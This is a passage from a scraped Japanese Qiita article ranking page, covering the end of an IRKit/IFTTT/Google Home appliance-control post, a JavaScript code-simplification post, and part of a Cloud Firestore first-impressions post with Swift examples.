<p>この段階で、IRKit経由で家電を制御できるかテストしておこう。まずは、赤外線信号を出力するためのURLを以下のように作っておく。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>https://api.getirkit.com/1/messages?clientkey=***clientkeyが入る***&amp;deviceid=***deviceidが入る***&amp;message=
</pre></div></div>

<p>ここで、<code>message</code>クエリパラメータの値として、先程読み取った赤外線信号の<code>message</code>プロパティの値を埋め込み、以下のような<code>curl</code>コマンドを組み立てる。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ curl -i 'https://api.getirkit.com/1/messages?clientkey=***clientkeyが入る***&amp;deviceid=***deviceidが入る***&amp;message={"format":"raw","freq":38,"data":[4713,1037,2451,1073,1319,1037,2451,1037,1319,1037,2451,1037,1319,1037,1319,1037,2451,1073,1275,1073,1275,1073,1275,1073,1275,56112,4713,1073,2451,1073,1275,1073,2451,1037,1319,1037,2451,1073,1275,1073,1275,1073,2451,1037,1319,1073,1319,1073,1319,1073,1319,56112,4713,1037,2451,1037,1275,1073,2451,1037,1319,1037,2451,1073,1319,1073,1319,1073,2451,1037,1319,1073,1319,1073,1319,1073,1319,56112,4713,1073,2451,1073,1275,1073,2451,1037,1319,1037,2451,1073,1275,1073,1275,1073,2451,1037,1319,1073,1319,1073,1319,1073,1319,56112,4713,1037,2451,1037,1275,1073,2451,1037,1319,1037,2451,1073,1275,1073,1275,1073,2451,1037,1319,1037,1319,1037,1319,1037,1319,56112,4713,1073,2451,1073,1319,1037,2451,1073,1275,1073,2451,1037,1319,1037,1319,1037,2451,1073,1275,1073,1275,1073,1275,1073,1275]}'
</pre></div></div>

<p>これを実行して、うまく家電が動くことを確認しておく。</p>

<p>ちなみに、このAPIはPOSTメソッドで呼び出すので本来はHTTPリクエストのBODY部分にこれらのパラメータを入れればよいはずだが、IFTTTのWebhookではなぜかうまく動作しなかったので上記のようなクエリパラメータ形式を使っている。</p>

<h3>
<span id="iftttのwebhookで呼び出す" class="fragment"></span><a href="#ifttt%E3%81%AEwebhook%E3%81%A7%E5%91%BC%E3%81%B3%E5%87%BA%E3%81%99"><i class="fa fa-link"></i></a>IFTTTのWebhookで呼び出す。</h3>

<p>最後に、IFTTTのAppletを作成する。Google Assistant連携部分はさきほどの説明とまったく同じで、トリガー時のアクションとしてWebhookを選択し、以下のようにIRKitのURLを指定する。</p>

<p><a href="https://camo.qiitausercontent.com/e3ae287e56586bd21aa1292ed9de92892489a603/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383239302f65653530626338332d303161362d313931622d396532342d3533346134346539383565662e706e67" target="_blank" rel="nofollow noopener"><img width="341" alt="Screen Shot 2017-10-08 at 7.10.54 PM.png" src="https://camo.qiitausercontent.com/e3ae287e56586bd21aa1292ed9de92892489a603/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383239302f65653530626338332d303161362d313931622d396532342d3533346134346539383565662e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/38290/ee50bc83-01a6-191b-9e24-534a44e985ef.png"></a></p>

<p>ここで、<code>Method</code>にはPOST、<code>ContentType</code>にはtext/plainを指定しておく。</p>

<p>以上で設定は完了。Google Homeから「テレビをつけて」等の指示を出すと、IRKitから赤外線信号が出て、テレビがオンになる。</p>

<p>ちなみに、ウチのソニーのテレビやシャープのエアコン等はこの仕組みでコントロールできたが、エアコン「白くまくん」はなぜかうまく動かなかった。なんだか高機能そうなリモコンで、赤外線信号も長いので、エアコンとリモコン間でなにかやり取りしているのかもしれない。それと、テレビから人の声が流れていると、Homeはそっちを認識してしまってうまく反応してくれない。テレビを見ながらHomeでザッピング、はあんまりうまくいかなかった。</p>

<p>とはいえ、部屋のどこからでも声だけで照明やテレビやエアコンをつけたり消したりできるのはなるほど便利である。お出かけのときに「電気消しといて」ってHomeに頼む感覚だ。</p>

<p>というわけで、IFTTTを使うとGoogle Homeからの家電のコントロールもあっけなく実現できた。ソファに寝そべったままの生活がどんどん推進されてしまいやばいのである。</p>

<hr>

<p>Disclaimer この記事は個人的なものです｡ここで述べられていることは私の個人的な意見に基づくものであり､私の雇用者には関係はありません｡</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">98位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>88</kbd>
		<a target="_blank" href="https://qiita.com/yassh/items/21b5f53a7ae2f5d4d63e">「それ、もっとスマートに書けるよ」がもっとスマートに書けるよ</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-08<br />05:18:53</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/141691.html">yassh</a>(2件の記事)<br><img width="80" height="80" src="https://secure.gravatar.com/avatar/bb1e8bdc58df5cd369aec898770c3216">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[JavaScript]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>「<a href="https://speakerdeck.com/wakamsha/sore-motutosumatonishu-keruyo-javascript-kodowomotutoduan-ku-motutosinpurunishu-ku-tips-4xuan" rel="nofollow noopener" target="_blank">それ、もっとスマートに書けるよ</a>」がもっとスマートに書けるよ。</p>

<h2>
<span id="ある特定の文字列が別の文字列内にあるかどうか" class="fragment"></span><a href="#%E3%81%82%E3%82%8B%E7%89%B9%E5%AE%9A%E3%81%AE%E6%96%87%E5%AD%97%E5%88%97%E3%81%8C%E5%88%A5%E3%81%AE%E6%96%87%E5%AD%97%E5%88%97%E5%86%85%E3%81%AB%E3%81%82%E3%82%8B%E3%81%8B%E3%81%A9%E3%81%86%E3%81%8B"><i class="fa fa-link"></i></a>ある特定の文字列が別の文字列内にあるかどうか</h2>

<blockquote>
<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">ua</span> <span class="o">=</span> <span class="nx">navigator</span><span class="p">.</span><span class="nx">userAgent</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="o">~</span><span class="nx">ua</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">'iPhone'</span><span class="p">)</span> <span class="o">||</span> <span class="o">~</span><span class="nx">ua</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">'iPod'</span><span class="p">)</span> <span class="o">||</span> <span class="o">~</span><span class="nx">ua</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">'iPad'</span><span class="p">))</span> <span class="p">{</span>
  <span class="k">return</span> <span class="s1">'ios'</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="k">return</span> <span class="s1">'other'</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>
</blockquote>

<p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/includes" rel="nofollow noopener" target="_blank">String.prototype.includes()</a>を使いましょう。</p>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">ua</span> <span class="o">=</span> <span class="nx">navigator</span><span class="p">.</span><span class="nx">userAgent</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="nx">ua</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">'iPhone'</span><span class="p">)</span> <span class="o">||</span> <span class="nx">ua</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">'iPod'</span><span class="p">)</span> <span class="o">||</span> <span class="nx">ua</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">'iPad'</span><span class="p">))</span> <span class="p">{</span>
  <span class="k">return</span> <span class="s1">'ios'</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="k">return</span> <span class="s1">'other'</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<p>※「それ、もっとスマートに書けるよ」を書いた人は<code>navigator.userAgent</code>を配列だと勘違いしていますが、<code>navigator.userAgent</code>は文字列です。（だから<code>ua.indexOf()</code>は<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/indexOf" rel="nofollow noopener" target="_blank">Array.prototype.indexOf()</a>ではなくて<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/indexOf" rel="nofollow noopener" target="_blank">String.prototype.indexOf()</a>です。）「ある特定の要素が配列内にあるかどうか」を調べる場合は、<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/includes" rel="nofollow noopener" target="_blank">Array.prototype.includes()</a>を使いましょう。</p>

<h2>
<span id="それ即時関数使わなくても出来るよ" class="fragment"></span><a href="#%E3%81%9D%E3%82%8C%E5%8D%B3%E6%99%82%E9%96%A2%E6%95%B0%E4%BD%BF%E3%82%8F%E3%81%AA%E3%81%8F%E3%81%A6%E3%82%82%E5%87%BA%E6%9D%A5%E3%82%8B%E3%82%88"><i class="fa fa-link"></i></a>それ即時関数使わなくても出来るよ</h2>

<blockquote>
<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="kr">const</span> <span class="p">{</span> <span class="nx">foo</span><span class="p">,</span> <span class="nx">bar</span> <span class="p">}</span> <span class="o">=</span> <span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">getHours</span><span class="p">()</span> <span class="o">&lt;</span> <span class="mi">12</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">{</span>
      <span class="nx">foo</span><span class="o">:</span> <span class="s1">'forenoon'</span><span class="p">,</span>
      <span class="nx">bar</span><span class="o">:</span> <span class="s1">'am'</span>
    <span class="p">}</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">{</span>
      <span class="nx">foo</span><span class="o">:</span> <span class="s1">'afternoon'</span><span class="p">,</span>
      <span class="nx">bar</span><span class="o">:</span> <span class="s1">'pm'</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">})();</span>
</pre></div></div>
</blockquote>

<p>三項演算子を使いましょう。</p>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="kr">const</span> <span class="p">{</span> <span class="nx">foo</span><span class="p">,</span> <span class="nx">bar</span> <span class="p">}</span> <span class="o">=</span>
  <span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">getHours</span><span class="p">()</span> <span class="o">&lt;</span> <span class="mi">12</span> <span class="o">?</span>
  <span class="p">{</span> <span class="nx">foo</span><span class="o">:</span> <span class="s1">'forenoon'</span><span class="p">,</span> <span class="nx">bar</span><span class="o">:</span> <span class="s1">'am'</span> <span class="p">}</span> <span class="o">:</span>
  <span class="p">{</span> <span class="nx">foo</span><span class="o">:</span> <span class="s1">'afternoon'</span><span class="p">,</span> <span class="nx">bar</span><span class="o">:</span> <span class="s1">'pm'</span> <span class="p">}</span>
</pre></div></div>

<h2>
<span id="urlクエリーパラメータのパース" class="fragment"></span><a href="#url%E3%82%AF%E3%82%A8%E3%83%AA%E3%83%BC%E3%83%91%E3%83%A9%E3%83%A1%E3%83%BC%E3%82%BF%E3%81%AE%E3%83%91%E3%83%BC%E3%82%B9"><i class="fa fa-link"></i></a>URLクエリーパラメータのパース</h2>

<blockquote>
<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">params</span><span class="p">.</span><span class="nx">reduce</span><span class="p">((</span><span class="nx">acc</span><span class="p">,</span> <span class="nx">param</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="kr">const</span> <span class="nx">pair</span> <span class="o">=</span> <span class="nx">param</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">'='</span><span class="p">);</span>
  <span class="nx">acc</span><span class="p">[</span><span class="nx">pair</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">pair</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
  <span class="k">return</span> <span class="nx">acc</span><span class="p">;</span>
<span class="p">},</span> <span class="p">{});</span>
</pre></div></div>
</blockquote>

<p><a href="https://developer.mozilla.org/en-US/docs/Web/API/URLSearchParams" rel="nofollow noopener" target="_blank">URLSearchParams</a>を使いましょう。</p>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span>
</pre></div></div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">99位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>88</kbd>
		<a target="_blank" href="https://qiita.com/1amageek/items/8179aebe871beb230194">Cloud Firestoreは進化したFirebase Realtime Database</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-05<br />03:23:17</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/80287.html">1amageek</a>(12件の記事)<br />(Cookpad Inc 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/80287/profile-images/1473701741">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Swift]</b> <b>[Firebase]</b> <b>[FirebaseRealtimeDatabase]</b> <b>[Firestore]</b> <b>[CloudFirestore]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="cloud-firestoreファーストインプレッション" class="fragment"></span><a href="#cloud-firestore%E3%83%95%E3%82%A1%E3%83%BC%E3%82%B9%E3%83%88%E3%82%A4%E3%83%B3%E3%83%97%E3%83%AC%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3"><i class="fa fa-link"></i></a>Cloud Firestoreファーストインプレッション</h1>

<p>リリース発表をついに来たか！って思いました。そしてFirestoreとFirebase Realtime Databaseがどう違うのかを読んで、大きく進化したなぁって思いました。そして実際に使ってみて、これはもはや別物って思いました。</p>

<p>FirestoreとFirebase Realtime Databaseの違いについてはすでにこちらでまとめられていたのでこちらをご覧ください。<br>
<a href="https://qiita.com/Yatima/items/54ea22d0cea1acc6cbcb" class="autolink" id="reference-4e237f3f89baf094d3a3">https://qiita.com/Yatima/items/54ea22d0cea1acc6cbcb</a></p>

<h1>
<span id="cloud-firestoreのすごいところ" class="fragment"></span><a href="#cloud-firestore%E3%81%AE%E3%81%99%E3%81%94%E3%81%84%E3%81%A8%E3%81%93%E3%82%8D"><i class="fa fa-link"></i></a>Cloud Firestoreのすごいところ</h1>

<h2>
<span id="firestoreにはboringsslが使われている" class="fragment"></span><a href="#firestore%E3%81%AB%E3%81%AFboringssl%E3%81%8C%E4%BD%BF%E3%82%8F%E3%82%8C%E3%81%A6%E3%81%84%E3%82%8B"><i class="fa fa-link"></i></a>Firestoreには<a href="https://boringssl.googlesource.com/boringssl/" rel="nofollow noopener" target="_blank">BoringSSL</a>が使われている</h2>

<p>BordingSSLはGoogleによるOpenSSLのfork。2014年にForkを発表して、すでにAndroidなどでは使われていたようですが、本格的にGoogleはBordingSSLを導入していくんですねぇ。素晴らしい。</p>

<h2>
<span id="grpcも使われている" class="fragment"></span><a href="#grpc%E3%82%82%E4%BD%BF%E3%82%8F%E3%82%8C%E3%81%A6%E3%81%84%E3%82%8B"><i class="fa fa-link"></i></a><a href="https://github.com/grpc/grpc" rel="nofollow noopener" target="_blank">gRPC</a>も使われている</h2>

<p>gRPC は、RPC (Remote Procedure Call) を実現するためにGoogleが開発したプロトコルの1つです。Protocol Buffers を使ってデータをシリアライズし、高速な通信を実現できる点が特長です。</p>

<p><a href="https://qiita.com/oohira/items/63b5ccb2bf1a913659d6" class="autolink" id="reference-692657cdce7d28ddd0dc">https://qiita.com/oohira/items/63b5ccb2bf1a913659d6</a></p>

<h2>
<span id="保存できるデータ型が増えた" class="fragment"></span><a href="#%E4%BF%9D%E5%AD%98%E3%81%A7%E3%81%8D%E3%82%8B%E3%83%87%E3%83%BC%E3%82%BF%E5%9E%8B%E3%81%8C%E5%A2%97%E3%81%88%E3%81%9F"><i class="fa fa-link"></i></a>保存できるデータ型が増えた。</h2>

<p>Cloud Firestore では、ブール値、数値、文字列、地理的位置、バイナリ blob、タイムスタンプなど、さまざまな値のデータ型がサポートされています。</p>

<p>地理的位置を保存できると言うことは！？おそらくここのソリューションも今後提供して来ることが予想されます。</p>

<p><a href="https://firebase.google.com/docs/firestore/manage-data/data-types?authuser=0" class="autolink" rel="nofollow noopener" target="_blank">https://firebase.google.com/docs/firestore/manage-data/data-types?authuser=0</a></p>

<h2>
<span id="subcollectionは分離されている" class="fragment"></span><a href="#subcollection%E3%81%AF%E5%88%86%E9%9B%A2%E3%81%95%E3%82%8C%E3%81%A6%E3%81%84%E3%82%8B"><i class="fa fa-link"></i></a>SubCollectionは分離されている</h2>

<p>Firebase Realtime Databaseが単純なツリー構造だったのに対しFirestoreのデータ構造は<strong>Collection</strong>, <strong>Document</strong>, <strong>SubCollection</strong>があります。</p>

<p><a href="https://firebase.google.com/docs/firestore/data-model?authuser=0#hierarchical-data" class="autolink" rel="nofollow noopener" target="_blank">https://firebase.google.com/docs/firestore/data-model?authuser=0#hierarchical-data</a></p>

<p>Firebase Realtime Databaseでも同じような構造をツリー構造で構築することは可能です。しかし、SubCollectionには決定的な違いがあります。Firebase Realtime Databaseでは上位のツリー構造の上位のノードを削除するとそれに付随する下位のデータは全て削除されました。Firestoreでは違います。</p>

<p>ドキュメントを削除しても、そのサブコレクションは削除されません。</p>

<blockquote>
<p>サブコレクションが関連付けられているドキュメントを削除しても、そのサブコレクションは削除されません。その後もサブコレクションには、リファレンスによるアクセスが可能です。たとえば、db.collection('coll').doc('doc') によって参照されるドキュメントは存在しなくなったにもかかわらず、db.collection('coll').doc('doc').collection('subcoll').doc('subdoc') によって参照されるドキュメントは存在する場合があります。ドキュメントを削除するときにサブコレクション内のドキュメントも削除する場合は、コレクションを削除するに示すように、手動で削除する必要があります。</p>
</blockquote>

<h3>
<span id="つまり親ノードのデータ量が重くならない" class="fragment"></span><a href="#%E3%81%A4%E3%81%BE%E3%82%8A%E8%A6%AA%E3%83%8E%E3%83%BC%E3%83%89%E3%81%AE%E3%83%87%E3%83%BC%E3%82%BF%E9%87%8F%E3%81%8C%E9%87%8D%E3%81%8F%E3%81%AA%E3%82%89%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>つまり親ノードのデータ量が重くならない</h3>

<p>FirestoreのSubCollectionは<strong>値</strong>ではないく<strong>参照</strong>です、Firebase Realtime Databaseでは上位ノードでデータを取得すると下位のデータを全て取得していたためデータが非常に重くなっていました。<br>
Firestoreではこれが解決されています。ちなみにFirebase Realtime Databaseでも同じことはできます。</p>

<p>Firebase Model Frameworkの<a href="https://github.com/1amageek/Salada" rel="nofollow noopener" target="_blank">Salada</a>ではRelationクラスでこれを実現しています。<br>
<a href="https://github.com/1amageek/Salada/blob/master/Salada/Relation.swift" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/1amageek/Salada/blob/master/Salada/Relation.swift</a></p>

<h2>
<span id="バッチ処理は強力な機能" class="fragment"></span><a href="#%E3%83%90%E3%83%83%E3%83%81%E5%87%A6%E7%90%86%E3%81%AF%E5%BC%B7%E5%8A%9B%E3%81%AA%E6%A9%9F%E8%83%BD"><i class="fa fa-link"></i></a>バッチ処理は強力な機能</h2>

<p>Firebase Realtime Databaseにも<code>updateValues</code>と言って複数のデータを同時に更新するメソッドは準備されていました。Firestoreではそれがさらに使いやすくなっています。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="c1">// Get new write batch</span>
<span class="kd">let</span> <span class="nv">batch</span> <span class="p">=</span> <span class="n">db</span><span class="p">.</span><span class="n">batch</span><span class="p">()</span>

<span class="c1">// Set the value of 'NYC'</span>
<span class="kd">let</span> <span class="nv">nycRef</span> <span class="p">=</span> <span class="n">db</span><span class="p">.</span><span class="n">collection</span><span class="p">(</span><span class="s">"cities"</span><span class="p">).</span><span class="n">document</span><span class="p">(</span><span class="s">"NYC"</span><span class="p">)</span>
<span class="n">batch</span><span class="p">.</span><span class="n">setData</span><span class="p">([:],</span> <span class="n">forDocument</span><span class="p">:</span> <span class="n">nycRef</span><span class="p">)</span>

<span class="c1">// Update the population of 'SF'</span>
<span class="kd">let</span> <span class="nv">sfRef</span> <span class="p">=</span> <span class="n">db</span><span class="p">.</span><span class="n">collection</span><span class="p">(</span><span class="s">"cities"</span><span class="p">).</span><span class="n">document</span><span class="p">(</span><span class="s">"SF"</span><span class="p">)</span>
<span class="n">batch</span><span class="p">.</span><span class="n">updateData</span><span class="p">([</span><span class="s">"population"</span><span class="p">:</span> <span class="mi">1000000</span> <span class="p">],</span> <span class="n">forDocument</span><span class="p">:</span> <span class="n">sfRef</span><span class="p">)</span>

<span class="c1">// Delete the city 'LA'</span>
<span class="kd">let</span> <span class="nv">laRef</span> <span class="p">=</span> <span class="n">db</span><span class="p">.</span><span class="n">collection</span><span class="p">(</span><span class="s">"cities"</span><span class="p">).</span><span class="n">document</span><span class="p">(</span><span class="s">"LA"</span><span class="p">)</span>
<span class="n">batch</span><span class="p">.</span><span class="n">deleteDocument</span><span class="p">(</span><span class="n">laRef</span><span class="p">)</span>

<span class="c1">// Commit the batch</span>
<span class="n">batch</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span> <span class="p">{</span> <span class="n">err</span> <span class="k">in</span>
    <span class="k">if</span> <span class="kd">let</span> <span class="nv">err</span> <span class="p">=</span> <span class="n">err</span> <span class="p">{</span>
        <span class="bp">print</span><span class="p">(</span><span class="s">"Error writing batch </span><span class="si">\(</span><span class="n">err</span><span class="si">)</span><span class="s">"</span><span class="p">)</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="bp">print</span><span class="p">(</span><span class="s">"Batch write succeeded."</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div></div>

<h2>
<span id="クエリはrealmのような使い心地" class="fragment"></span><a href="#%E3%82%AF%E3%82%A8%E3%83%AA%E3%81%AFrealm%E3%81%AE%E3%82%88%E3%81%86%E3%81%AA%E4%BD%BF%E3%81%84%E5%BF%83%E5%9C%B0"><i class="fa fa-link"></i></a>クエリはRealmのような使い心地</h2>

<p>定義したクエリの参照を監視し続けることができます。<br>
クエリの使い心地よりも注目すべきはこのプロパティ<code>hasPendingWrites</code>。<br>
いつ使うかと言うとチャットです。</p>

<p>例えばチャットでメッセージを送信した瞬間を想像してください。<br>
Firebase Realtime Databaseではバックエンドのイベントをオブザーブしていたので、データがバックエンドに保存された後UIが更新されることになり若干の遅れを体感していたはずです。<br>
しかし、Firestoreでは、バックエンドに保存される前であってもクライアントから書き込みがあったことを取得できるのでその遅れを感じなくてよくなります。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span><span class="n">db</span><span class="p">.</span><span class="n">collection</span><span class="p">(</span><span class="s">"cities"</span><span class="p">).</span><span class="n">document</span><span class="p">(</span><span class="s">"SF"</span><span class="p">)</span>
    <span class="p">.</span><span class="n">addSnapshotListener</span> <span class="p">{</span> <span class="n">documentSnapshot</span><span class="p">,</span> <span class="n">error</span> <span class="k">in</span>
        <span class="k">guard</span> <span class="kd">let</span> <span class="nv">document</span> <span class="p">=</span> <span class="n">documentSnapshot</span> <span class="k">else</span> <span class="p">{</span>
            <span class="bp">print</span><span class="p">(</span><span class="s">"Error fetching document: </span><span class="si">\(</span><span class="n">error</span><span class="p">!</span><span class="si">)</span><span class="s">"</span><span class="p">)</span>
            <span class="k">return</span>
        <span class="p">}</span>
        <span class="kd">let</span> <span class="nv">source</span> <span class="p">=</span> <span class="n">document</span><span class="p">.</span><span class="n">metadata</span><span class="p">.</span><span class="n">hasPendingWrites</span> <span class="p">?</span> <span class="s">"Local"</span> <span class="p">:</span> <span class="s">"Server"</span>
        <span class="bp">print</span><span class="p">(</span><span class="s">"</span><span class="si">\(</span><span class="n">source</span><span class="si">)</span><span class="s"> data: </span><span class="si">\(</span><span class="n">document</span><span class="p">.</span><span class="n">data</span><span class="si">())</span><span class="s">"</span><span class="p">)</span>
    <span class="p">}</span>

<span class="c1">// After 2 seconds, make an update so our listener will fire again.</span>
<span class="kd">let</span> <span class="nv">deadlineTime</span> <span class="p">=</span> <span class="n">DispatchTime</span><span class="p">.</span><span class="n">now</span><span class="p">()</span> <span class="o">+</span> <span class="p">.</span><span class="n">seconds</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">DispatchQueue</span><span class="p">.</span><span class="n">main</span><span class="p">.</span><span class="n">asyncAfter</span><span class="p">(</span><span class="n">deadline</span><span class="p">:</span> <span class="n">deadlineTime</span><span class="p">)</span> <span class="p">{</span>
    <span class="kc">self</span><span class="p">.</span><span class="n">db</span><span class="p">.</span><span class="n">collection</span><span class="p">(</span><span class="s">"cities"</span><span class="p">).</span><span class="n">document</span><span class="p">(</span><span class="s">"SF"</span><span class="p">).</span><span class="n">updateData</span><span class="p">([</span>
        <span class="s">"population"</span><span class="p">:</span> <span class="mi">1000000</span>
        <span class="p">])</span>
<span class="p">}</span>

<span class="c1">// RESULT:</span>
<span class="c1">// Server data: ["state": CA, "name": San Francisco, "population": 999999]</span>

<span class="c1">// Local data: ["state": CA, "name": San Francisco, "population": 1000000]</span>
<span class="c1">// Server data: ["state": CA, "name": San Francisco, "population": 1000000]</span>
</pre></div></div>

<p>完了だけを監視することもできるようです。</p>

<blockquote>
<p>書き込みが完了したことだけを知りたい場合、hasPendingWrites を使用する代わりに、完了コールバックをリッスンすることができます。</p>
</blockquote>

<h3>
<span id="やっぱりfirebaseのqueryは" class="fragment"></span><a href="#%E3%82%84%E3%81%A3%E3%81%B1%E3%82%8Afirebase%E3%81%AEquery%E3%81%AF"><i class="fa fa-link"></i></a>やっぱりFirebaseのQueryは。。</h3>

<p>Firebase Realtime Databaseよりは表現力は格段に上がっていますが、これだけのためにFirestoreを選択する理由にはならないと思います。</p>

<p><a href="https://firebase.google.com/docs/firestore/query-data/order-limit-data?authuser=0" class="autolink" rel="nofollow noopener" target="_blank">https://firebase.google.com/docs/firestore/query-data/order-limit-data?authuser=0</a></p>

<h2>
<span id="realtimeに制限ができた" class="fragment"></span><a href="#realtime%E3%81%AB%E5%88%B6%E9%99%90%E3%81%8C%E3%81%A7%E3%81%8D%E3%81%9F"><i class="fa fa-link"></i></a>Realtimeに制限ができた</h2>

<blockquote>
<p>Cloud Firestore では、1 つのドキュメントを 1 秒間に約 2 回しか更新できません。<br>
そんなに強烈な制限ではないですが、時間的な制限があるようです。</p>
</blockquote>

<h2>
<span id="データ数の取得は今まで通り" class="fragment"></span><a href="#%E3%83%87%E3%83%BC%E3%82%BF%E6%95%B0%E3%81%AE%E5%8F%96%E5%BE%97%E3%81%AF%E4%BB%8A%E3%81%BE%E3%81%A7%E9%80%9A%E3%82%8A"><i class="fa fa-link"></i></a>データ数の取得は今まで通り</h2>

<p>Collectionに入っているデータ数を取得したいときは次のようにする必要があります。</p>

<div class="code-frame" data-lang="swift"><div class="highlight"><pre><span></span>        <span class="kd">let</span> <span class="nv">db</span> <span class="p">=</span> <span class="n">Firestore</span><span class="p">.</span><span class="n">firestore</span><span class="p">()</span>
        <span class="kd">let</span> <span class="nv">citiesRef</span> <span class="p">=</span> <span class="n">db</span><span class="p">.</span><span class="n">collection</span><span class="p">(</span><span class="s">"cities"</span><span class="p">)</span>

        <span class="n">citiesRef</span><span class="p">.</span><span class="n">getDocuments</span> <span class="p">{</span> <span class="p">(</span><span class="n">snapshot</span><span class="p">,</span> <span class="n">error</span><span class="p">)</span> <span class="k">in</span>
            <span class="bp">print</span><span class="p">(</span><span class="n">snapshot</span><span class="p">?.</span><span class="bp">count</span><span class="p">)</span>  <span class="c1">// データ数の取得</span>
        <span class="p">}</span>
</pre></div></div>

<p>例えばフォロワーカウントをとりたい場合を想像してください。カウントなので数値だけが取れればいいはずですが、Firebaseでは全てのデータを取得してからでないと取得できません。<br>
また、カウントを効率的に取得するためにはデータを保存したタイミングで別に数値型のプロパティを用意しトランザクションをしながらインクリメントしていくしかありません。</p>

<p>Firebase SDKにFeature Requestを送っているので、ここで<strong>いいね</strong>を押してもらえるとプライオリティが上がるかも。</p>

<p><a href="https://github.com/firebase/firebase-ios-sdk/issues/257" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/firebase/firebase-ios-sdk/issues/257</a></p>

<p>ちなみにSaladaではRelationにインクリメントする機能を持たせているため、<code>count</code>ってするだけで取得できるようにしています。</p>

